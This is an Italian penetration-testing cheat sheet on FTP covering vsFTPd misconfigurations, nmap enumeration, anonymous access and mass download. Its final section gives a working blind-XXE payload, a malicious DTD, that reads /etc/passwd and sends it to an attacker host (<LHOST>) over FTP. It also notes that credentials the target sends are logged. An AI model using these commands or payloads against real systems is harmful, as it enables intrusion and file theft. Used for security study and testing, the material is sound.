# FTP — File Transfer Protocol
**Porte:** 21 (controllo), 20 (dati)  
**Categoria:** Trasferimento File

Protocollo per il trasferimento file che opera al livello Applicazione.
Usa due canali separati: controllo (porta 21) e dati (porta 20).
Trasmette TUTTO in chiaro: credenziali e file possono essere intercettati.

Modalità Attiva: il server si connette al client per inviare dati (bloccata dai firewall).
Modalità Passiva: il client si connette al server (più compatibile, usata oggi).

TFTP (Trivial FTP): variante su UDP, senza autenticazione, solo get/put.
Da non confondere con SFTP (SSH File Transfer) o FTPS (FTP over SSL).

## Configurazione

- Server principale Linux: vsFTPd (Very Secure FTP Daemon)
- File config: /etc/vsftpd.conf
- Utenti vietati: /etc/ftpusers (root, guest, ecc.)
- Vedere config attiva: cat /etc/vsftpd.conf | grep -v '#'

## Vulnerabilità comuni

- Login anonimo (anonymous_enable=YES) — accesso senza credenziali
- Upload anonimo (anon_upload_enable=YES) — caricamento file malevoli
- Credenziali in chiaro — sniffabili con Wireshark/tcpdump
- hide_ids=NO — mostra i veri username dei file (utile per brute force SSH)
- ls_recurse_enable=YES — mappa l'intero server con ls -R in pochi secondi
- ssl_enable=NO — nessuna crittografia, tutto intercettabile
- Versioni obsolete di vsFTPd/ProFTPd con exploit noti (es. vsFTPd 2.3.4 backdoor)

## Enumerazione & Comandi

### SCAN & RILEVAMENTO

```bash
sudo nmap -sV -p21 -sC -A <IP>                     # Scan aggressivo porta 21
sudo nmap --script ftp-anon -p21 <IP>               # Check accesso anonimo
```

### CONNESSIONE MANUALE

```bash
ftp <IP> [porta]                                     # Connessione manuale
  > anonymous / anonymous                            # Login anonimo
  > status                                           # Info configurazione server
  > debug                                            # Mostra pacchetti raw client→server
  > trace                                            # Mostra ogni pacchetto scambiato
  > ls -R                                            # Lista ricorsiva (se abilitata)
  > get <file>                                       # Scarica un file
  > put <file>                                       # Carica un file (se permesso)
```

### DOWNLOAD DI MASSA

```bash
wget -m --no-passive ftp://anonymous:anonymous@<IP>  # Scarica tutto il server FTP
```

### CERTIFICATI & CRITTOGRAFIA

```bash
openssl s_client -connect <IP>:21 -starttls ftp      # Verifica certificati SSL/TLS
```

## OOB con catch

Il server FTP di catch è pensato per esfiltrare dati da **blind XXE**.

```bash
# Avvia il FTP logger
catch ftp on [--port 2121]
```

### Esfiltrazione dati da blind XXE

Se trovi un endpoint che parsa XML (upload, API SOAP, import), puoi esfiltrare file
del target facendogli inviare il contenuto come path FTP.

1. Crea un DTD malevolo in `static/evil.dtd` (via SLWeb):

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'ftp://<LHOST>:2121/%data;'>">
%send;
```

2. Invia l'XML al target:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<LHOST>:2727/static/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

Nel log di `catch logs ftp` vedi il contenuto di `/etc/passwd` come path FTP.

Le credenziali FTP tentate dal target vengono loggate automaticamente (USER + PASS).

## Tool consigliati

*Installa con `use <tool>` + `install`*

- **nmap**
- **nikto**
- **impacket**
